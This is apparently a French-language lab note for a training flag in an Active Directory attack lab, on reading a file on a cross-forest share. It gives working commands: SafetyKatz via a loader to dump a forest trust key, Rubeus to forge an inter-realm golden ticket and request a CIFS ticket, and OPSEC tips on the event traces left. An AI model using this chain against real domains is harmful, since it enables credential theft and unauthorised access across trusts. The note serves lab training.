---
flag: 32
machine: eurocorp-dc
statut: à faire
technique: Cross-forest share access (referral ticket + CIFS)
LO: "[[LO20 - Cross-forest share]]"
---

# F32 · Contenu de secret.txt (eurocorp-dc)

> [!summary] Objectif
> Lire `\\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt` en utilisant le TGS CIFS obtenu via le trust inter-forêt.

## Contexte
- **Etape attack flow**: suite directe de F31 — TGS CIFS/eurocorp-dc injecté dans la session.
- **Ce qu'on a**: ticket CIFS valide pour `eurocorp-dc.eurocorp.local`.
- **Ce qu'on cherche**: le contenu du fichier `secret.txt` sur le partage `SharedwithDCorp`.

## Solution

### Etape 1: vérifier le TGS injecté
```powershell
klist
```

### Etape 2: énumérer et lire le partage cross-forest
```powershell
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
Get-Content \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```
→ Voir [[Cheatsheet - Trusts et forêts]] et [[Cheatsheet - Lateral movement]].

### Etape 3 (alternative): rappel de la chaîne complète
```powershell
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
Rubeus.exe golden /rc4:<trust_key> /netbios:dcorp /sid:<dcorp_sid> /user:Administrator /service:krbtgt /target:eurocorp.local /ptt
Rubeus.exe asktgs /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
Get-Content \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```

## Reponse

| Element | Valeur |
|---------|--------|
| Contenu de `secret.txt` | `<A REMPLIR DEPUIS LAB>` |
| UNC path | `\\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt` |

## Pieges et OPSEC
- Accéder via **FQDN** (`eurocorp-dc.eurocorp.local`) — le SPN CIFS du TGS est lié au FQDN, un nom court fait échouer la couche SMB.
- Si `Access is denied` : vérifier que `klist` montre bien un TGS `CIFS/eurocorp-dc.eurocorp.local` frais et non expiré.
- Le compte usurpé (`Administrator@dcorp`) traverse le trust — mais **FILTER_SIDS** limite les droits à ce que ce compte a réellement côté eurocorp (ici : lecture du share ouvert cross-forest).
- Trace: 4624 (LogonType 3, Kerberos) sur `eurocorp-dc` + 5140 (network share accessed).

## Refs
- [[Cheatsheet - Trusts et forêts]]
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Lateral movement]]
- [[LO20 - Cross-forest share]]
- [[Synthèse - Trusts et forêts]]

[[Flags - Index]] · [[Journal - Index]]
